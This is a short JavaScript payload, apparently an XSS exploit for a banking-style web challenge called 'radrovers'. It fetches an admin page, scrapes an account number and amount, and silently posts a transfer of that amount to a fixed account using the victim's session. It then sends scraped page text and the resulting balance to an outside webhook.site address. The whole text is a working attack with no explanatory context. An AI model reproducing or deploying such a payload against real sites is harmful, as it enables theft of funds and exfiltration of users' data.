
fetch('/radrovers/admin').then(r=>r.text()).then(t=>{
  var m = t.match(/<option value="([A-Z]{2}-\d{4}-\d{4}-\d{4})">[^<]*\((\d+) [Cc]\w+\)/);
  if(!m){
    window.location.href='https://webhook.site/14a8d1cb-438a-4891-aa70-1b1b1c32a3c1/q3nomatch?snip='+encodeURIComponent(t.slice(4500,5500));
    return;
  }
  var from=m[1], amt=m[2];
  var fd='from_account='+encodeURIComponent(from)+'&to_account=XX-1111-2222-3333&amount='+amt;
  fetch('/radrovers/transfer',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:fd,credentials:'same-origin'}).then(()=>{
    fetch('/radrovers/admin').then(r=>r.text()).then(t2=>{
      var bm=t2.match(/<td class="text-end[^>]*>\s*(\d+)/);
      window.location.href='https://webhook.site/14a8d1cb-438a-4891-aa70-1b1b1c32a3c1/q3result?from='+from+'&amt='+amt+'&balance='+(bm?bm[1]:'NA');
    });
  });
});
